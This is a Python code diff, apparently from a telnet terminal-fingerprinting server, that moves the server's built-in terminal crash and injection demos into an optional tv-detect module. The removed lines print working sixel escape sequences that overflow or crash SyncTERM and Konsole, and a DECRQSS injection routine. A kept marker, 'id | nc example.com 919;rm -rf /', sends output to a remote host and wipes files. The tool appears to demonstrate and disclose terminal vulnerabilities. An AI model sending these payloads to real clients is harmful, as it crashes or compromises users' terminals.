@@ -26,6 +26,21 @@ if TYPE_CHECKING:
     import blessed
     import prettytable
 
+# third-party (optional)
+try:
+    from tv_detect.attacks import ATTACKS as _TV_ATTACKS, SEVERITY_COLOR
+    from tv_detect.attacks import DECRQSS_INJECT_MARKER as _DECRQSS_INJECT_MARKER
+    from tv_detect.execute import (
+        prompt_keys as _tv_prompt_keys,
+        execute_attack as _tv_execute_attack,
+        get_attacks_for_software as _tv_get_attacks,
+        get_vulnerability_rows as _tv_vuln_rows,
+        try_decrqss_injection,
+    )
+    _HAS_TV_DETECT = True
+except ImportError:
+    _HAS_TV_DETECT = False
+
 # local
 from ._paths import _atomic_json_write
 from .accessories import PATIENCE_MESSAGES
@@ -544,6 +559,21 @@ _CVE_2005_1205_URL = "https://nvd.nist.gov/vuln/detail/CVE-2005-1205"
 _DECRQCRA_REF_URL = "https://dgl.cx/2023/09/ansi-terminal-security"
 
 
+def _extract_software_name(data: Dict[str, Any]) -> str:
+    """Extract terminal software name from fingerprint data.
+
+    Checks XTVERSION ``software_name`` first, then falls back to
+    the TTYPE / TERM environment variable from the telnet probe.
+    """
+    terminal_session = data.get("terminal-probe", {}).get("session_data", {})
+    sw = terminal_session.get("software_name") or ""
+    if sw:
+        return sw
+    telnet_probe = data.get("telnet-probe", {})
+    extra = telnet_probe.get("session_data", {}).get("extra", {})
+    return extra.get("TERM") or ""
+
+
 def _build_vulnerabilities_rows(
     term: "blessed.Terminal", data: Dict[str, Any]
 ) -> List[Tuple[str, str]]:
@@ -557,11 +587,6 @@ def _build_vulnerabilities_rows(
     medium: List[Tuple[str, str]] = []
     low: List[Tuple[str, str]] = []
 
-    # Detect SyncTERM for SyncTERM-specific vulnerabilities
-    telnet_probe = data.get("telnet-probe", {})
-    _extra = telnet_probe.get("session_data", {}).get("extra", {})
-    _is_syncterm = "syncterm" in (_extra.get("TERM") or "").lower()
-
     _high = term.bold_firebrick1
     _med = term.darkorange
     _low = term.yellowgreen
@@ -574,16 +599,14 @@ def _build_vulnerabilities_rows(
         ref = _osc8(_DECRQCRA_REF_URL, "Leadbeater 2023")
         high.append((ref, f"{_high('[HIGH]')} {_high('Response injection (DECRQSS)')}"))
 
-    # SyncTERM sixel crashes (2 and 3 are HIGH)
-    if _is_syncterm:
-        high.append((
-            "undisclosed (2)",
-            f"{_high('[HIGH]')} {_high('Heap overflow (undersized alloc)')}",
-        ))
-        high.append((
-            "undisclosed (3)",
-            f"{_high('[HIGH]')} {_high('Heap overflow (zero-size alloc)')}",
-        ))
+    # Terminal-specific vulnerabilities from tv-detect
+    if _HAS_TV_DETECT:
+        sw_name = _extract_software_name(data)
+        _sev_fn = {"HIGH": _high, "MEDIUM": _med, "LOW": _low}
+        for ref, sev, name in _tv_vuln_rows(sw_name):
+            fn = _sev_fn.get(sev, _low)
+            bucket = {"HIGH": high, "MEDIUM": medium, "LOW": low}.get(sev, low)
+            bucket.append((ref, f"{fn(f'[{sev}]')} {fn(name)}"))
 
     # -- MEDIUM --
 
@@ -1068,8 +1091,7 @@ def _nearest_match_lines(
 
 def _repl_prompt(
     term: "blessed.Terminal",
-    is_syncterm: bool = False,
-    is_konsole: bool = False,
+    software_name: str = "",
 ) -> None:
     """Write the REPL prompt with command legend."""
     bk = _bracket_key
@@ -1077,10 +1099,12 @@ def _repl_prompt(
         f"{bk(term, 't')}ERM or TE{bk(term, 'l')}NET details?",  # codespell:ignore te
         f"{bk(term, 's')}ummarize, {bk(term, 'u')}pdate, or s{bk(term, 'h')}ow DB",
     ]
-    if is_syncterm:
-        lines.append(f"{bk(term, 'c')}rash SyncTERM?! {bk(term, 'q')}uit")
-    elif is_konsole:
-        lines.append(f"{bk(term, 'c')}rash Konsole?! {bk(term, 'q')}uit")
+    if _HAS_TV_DETECT:
+        pk = _tv_prompt_keys(software_name=software_name)
+        if pk["available"]:
+            lines.append(f"{bk(term, 'v')}ulnerabilities, {bk(term, 'q')}uit")
+        else:
+            lines.append(f"{bk(term, 'q')}uit")
     else:
         lines.append(f"{bk(term, 'q')}uit")
     legend = "\r\n".join(lines)
@@ -1111,30 +1135,8 @@ def _read_line(term: "blessed.Terminal") -> str:
             echo(ch)
 
 
-_DECRQSS_INJECT_MARKER = "id | nc example.com 919;rm -rf /"
-
-
-def _try_decrqss_injection() -> bool:
-    """Attempt DECRQSS command injection and return whether it succeeded.
-
-    Sends a DECRQSS query whose payload contains a marker string.
-    Vulnerable terminals (CVE-2008-2383 / CVE-2022-45872) echo the
-    payload back to our stdin.  We do a short raw read to capture the
-    response before blessed's inkey() can misparse the ESC byte.
-    """
-    import select
-
-    sys.stdout.write(f"\x1bP$q{_DECRQSS_INJECT_MARKER}\r\x1b\\")
-    sys.stdout.flush()
-
-    fd = sys.stdin.fileno()
-    ready, _, _ = select.select([fd], [], [], 0.5)
-    if not ready:
-        return False
-
-    buf = os.read(fd, 4096)
-    logger.debug("DECRQSS response: %r", buf)
-    return _DECRQSS_INJECT_MARKER.encode("latin-1") in buf
+if not _HAS_TV_DETECT:
+    _DECRQSS_INJECT_MARKER = "id | nc example.com 919;rm -rf /"
 
 
 def _paginate(term: "blessed.Terminal", text: str, **_kw: Any) -> None:
@@ -1283,83 +1285,55 @@ def _filter_telnet_detail(detail: Optional[Dict[str, Any]]) -> Optional[Dict[str
     return result
 
 
-_CRASHME_ATTACKS = {
-    "2": {
-        "name": "Heap overflow (undersized alloc)",
-        "severity": "HIGH",
-        "target": "SyncTerm/CTerm",
-        "sequence": '\x1bP0;0;0q"186414;1;640;350' + '~' * 512 + '\x1b\\',
-    },
-    "3": {
-        "name": "Heap overflow (zero-size alloc)",
-        "severity": "HIGH",
-        "target": "SyncTerm/CTerm",
-        "sequence": '\x1bP0;0;0q"8388608;1;640;350' + '~' * 100 + '\x1b\\',
-    },
-    "4": {
-        "name": "Sixel aspect ratio OOM crash",
-        "severity": "LOW",
-        "target": "Konsole",
-        "sequence": '\x1bP0;0;0q"500000;1;64;6' + '~' * 64 + '\x1b\\',
-    },
-    "5": {
-        "name": "Sixel aspect ratio int overflow",
-        "severity": "LOW",
-        "target": "Konsole",
-        "sequence": '\x1bP0;0;0q"7000000;1;8;350' + '~' * 8 + '\x1b\\',
-    },
-}
-
-_SEVERITY_COLOR = {
-    "LOW": "bold_gold1",
-    "MEDIUM": "darkorange",
-    "HIGH": "bold_firebrick1",
-}
 
 
-def _crashme_prompt(
+def _vuln_menu(
     term: "blessed.Terminal",
-    is_syncterm: bool = False,
-    is_konsole: bool = False,
+    software_name: str = "",
 ) -> Optional[str]:
-    """Show crashme menu filtered by detected terminal."""
+    """Show vulnerability attack menu, using tv-detect.
+
+    When the terminal is a known target, show only matching attacks.
+    When unknown, show all attacks so the user can try any of them.
+    """
+    if not _HAS_TV_DETECT:
+        return None
     echo = functools.partial(print, end="", flush=True)
-    targets: set[str] = set()
-    if is_syncterm:
-        targets.add("SyncTerm/CTerm")
-    if is_konsole:
-        targets.add("Konsole")
-    available = {
-        k: v for k, v in _CRASHME_ATTACKS.items()
-        if v.get("target") in targets
-    }
+    available = _tv_get_attacks(software_name)
     if not available:
         echo(f"\r\n{term.bold('No attacks available for this terminal.')}\r\n")
         return None
-    echo(f"\r\n{term.bold('Select a risky crash !')}\r\n\r\n")
-    for key in sorted(available):
+    echo(f"\r\n{term.bold('Terminal vulnerabilities')}\r\n\r\n")
+    for key in sorted(available, key=int):
         attack = available[key]
         sev = attack["severity"]
-        color_fn = getattr(term, _SEVERITY_COLOR.get(sev, "normal"))
+        color_fn = getattr(term, SEVERITY_COLOR.get(sev, "normal"))
         sev_str = color_fn(f"[{sev}]")
         target = attack.get("target", "")
         target_str = f" ({target})" if target else ""
         echo(f"  ({term.bold(key)}) {sev_str} {attack['name']}{target_str}\r\n")
     echo(f"\r\n: ")
-    key = str(term.inkey(timeout=None)).strip()
+    key = _read_line(term).strip()
     if key in available:
         return key
     return None
 
 
-def _execute_crash(term: "blessed.Terminal", key: str) -> None:
-    """Execute a crashme attack by letter key."""
+def _execute_crash(term: "blessed.Terminal", key: str,
+                   software_name: str = "") -> None:
+    """Execute a vulnerability attack by key, delegating to tv-detect."""
+    if not _HAS_TV_DETECT:
+        return
     echo = functools.partial(print, end="", flush=True)
-    attack = _CRASHME_ATTACKS[key]
-    echo(f"\r\n{term.bold_firebrick1('Crash')}: {attack['name']}...\r\n")
-    sys.stdout.buffer.write(attack["sequence"].encode("latin-1"))
-    sys.stdout.buffer.flush()
-    echo(f"{term.bold('Sent.')} The client may have crashed.\r\n")
+    result = _tv_execute_attack(key, software_name=software_name)
+    if result.get("executed"):
+        name = result.get("attack_name", "unknown")
+        echo(f"\r\n{term.bold_firebrick1('Crash')}: {name}\r\n")
+        if note := result.get("note"):
+            echo(f"  {term.bold_black(note)}\r\n")
+        echo(f"{term.bold('Sent.')} The client may have crashed.\r\n")
+    elif error := result.get("error"):
+        echo(f"\r\n{term.bold(error)}\r\n")
 
 
 def _show_detail(term: "blessed.Terminal", data: Dict[str, Any], section: str) -> None:
@@ -1493,18 +1467,7 @@ def _fingerprint_repl(
 ) -> None:
     """Interactive REPL for exploring fingerprint data."""
     ip = _client_ip(data)
-
-    # Detect SyncTERM by TERM env var or TTYPE
-    telnet_probe = data.get("telnet-probe", {})
-    session_data = telnet_probe.get("session_data", {})
-    extra = session_data.get("extra", {})
-    ttype = (extra.get("TERM") or "").lower()
-    is_syncterm = "syncterm" in ttype
-
-    # Detect Konsole by XTVERSION software_name
-    terminal_session = data.get("terminal-probe", {}).get("session_data", {})
-    software_name = (terminal_session.get("software_name") or "").lower()
-    is_konsole = "konsole" in software_name
+    software_name = _extract_software_name(data)
 
     _commands = {
         "q": "logoff",
@@ -1515,8 +1478,8 @@ def _fingerprint_repl(
         "h": "database",
         "\x0c": "refresh",
     }
-    if is_syncterm or is_konsole:
-        _commands["c"] = "crashme"
+    if _HAS_TV_DETECT:
+        _commands["v"] = "vulnerabilities"
 
     db_cache = None
     decrqss_tried = False
@@ -1526,20 +1489,19 @@ def _fingerprint_repl(
     decrqss_vulnerable = bool(cve_results.get("CVE-2008-2383"))
 
     while True:
-        _repl_prompt(term, is_syncterm=is_syncterm, is_konsole=is_konsole)
+        _repl_prompt(term, software_name=software_name)
         while term.inkey(timeout=0):
             pass
 
-        if decrqss_vulnerable and not decrqss_tried:
+        if _HAS_TV_DETECT and decrqss_vulnerable and not decrqss_tried:
             decrqss_tried = True
-            if _try_decrqss_injection():
+            if try_decrqss_injection():
                 echo(
                     f"{term.bold_red}{_DECRQSS_INJECT_MARKER}{term.normal}\r\n"
                     f"{term.bold_red}^^ injected via CVE-2008-2383 DECRQSS"
                     f" echoback{term.normal}\r\n\r\n"
                 )
                 logger.info("%s: DECRQSS injection demonstrated", ip)
-                # drain any remaining DCS response bytes from stdin
                 import select
                 while select.select([sys.stdin.fileno()], [], [], 0.2)[0]:
                     os.read(sys.stdin.fileno(), 4096)
@@ -1580,10 +1542,10 @@ def _fingerprint_repl(
             _prompt_fingerprint_identification(term, data, filepath, _names)
             names = _load_fingerprint_names()
             seen_counts = _build_seen_counts(data, names, term)
-        elif cmd == "c" and (is_syncterm or is_konsole):
-            choice = _crashme_prompt(term, is_syncterm=is_syncterm, is_konsole=is_konsole)
+        elif cmd == "v" and _HAS_TV_DETECT:
+            choice = _vuln_menu(term, software_name=software_name)
             if choice:
-                _execute_crash(term, choice)
+                _execute_crash(term, choice, software_name=software_name)
         elif cmd == "\x0c":
             echo(term.normal + term.clear)
             _display_compact_summary(data, term)
